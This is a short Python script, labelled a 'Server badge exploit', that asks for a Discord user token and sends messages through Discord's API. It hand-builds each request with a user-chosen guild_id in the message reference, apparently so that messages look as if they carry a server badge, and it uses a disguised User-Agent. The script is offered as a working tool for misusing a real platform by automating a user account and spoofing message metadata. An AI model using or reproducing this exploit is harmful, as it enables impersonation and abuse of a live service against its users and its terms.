import requests
import random
import json
import sys
running = True
token = input("Enter you token: ")

#messy code, threw it together quick in as little lines as possible

def request(token, channelID, guildID, messageContent, messageID):
    baseURL = f"https://discordapp.com/api/channels/{channelID}/messages"
    headers = { "Authorization":token,
            "User-Agent":"Mozilla/5.0 (<system-information>) <platform> (<platform-details>) <extensions>",
            "Content-Type":"application/json", }
    POSTedJSON =  json.dumps ({"content":messageContent, "nonce": str(random.randrange(5000,5000000)),"tts":False,"message_reference": {"guild_id":guildID,"channel_id":channelID,"message_id":messageID},"allowed_mentions":{"parse":["users","roles","everyone"],"replied_user":True}})
    requests.post(baseURL, headers = headers, data = POSTedJSON)
    print('Sent')

while running:
    resp = input('Server badge exploit made by Seraph#9999 | Type q to exit or press enter to continue: ')
    if (resp == 'q'):
        sys.exit()
    guildID = input("Enter guild id: ") 
    channelID = input("Enter channel id: ")
    messageContent = input("Enter the message you want to send with a server badge: ")
    messageID = input('Enter the id of a reply: ')
    request(token, channelID, guildID, messageContent, messageID)
